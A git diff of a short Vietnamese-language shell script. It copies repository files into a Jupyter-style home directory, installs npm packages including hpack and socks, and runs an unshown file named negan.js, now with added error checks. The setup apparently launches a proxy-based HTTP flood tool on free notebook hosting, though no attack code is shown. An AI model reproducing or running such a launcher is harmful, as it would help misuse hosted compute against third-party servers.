@@ -4,7 +4,6 @@ echo "--------------------------------------------------"
 echo "🔄 Sao chép file từ repo..."
 echo "--------------------------------------------------"
 
-# Sao chép toàn bộ file từ repo về thư mục hiện tại
 cp -r . /home/jovyan/ 2>/dev/null
 
 echo "✅ Kiểm tra file đã copy:"
@@ -14,8 +13,12 @@ echo "--------------------------------------------------"
 echo "🔄 Cài đặt npm package..."
 echo "--------------------------------------------------"
 
-# Cài đặt các package npm
 npm install hpack https commander colors socks
+
+if [ $? -ne 0 ]; then
+    echo "❌ Lỗi trong quá trình cài đặt npm package!"
+    exit 1
+fi
 
 echo "✅ Hoàn thành cài đặt!"
 
@@ -23,10 +26,11 @@ echo "--------------------------------------------------"
 echo "🚀 Chạy node negan.js..."
 echo "--------------------------------------------------"
 
-# Chạy negan.js trực tiếp
-node /home/jovyan/negan.js  
+node negan.js
 
-echo "✅ negan.js đã kết thúc!"
+if [ $? -ne 0 ]; then
+    echo "❌ Lỗi khi chạy node negan.js!"
+    exit 1
+fi
 
-echo "🚨 Hủy deploy..."
-exit 1  # Dừng deploy
+echo "✅ Đã chạy thành công!"
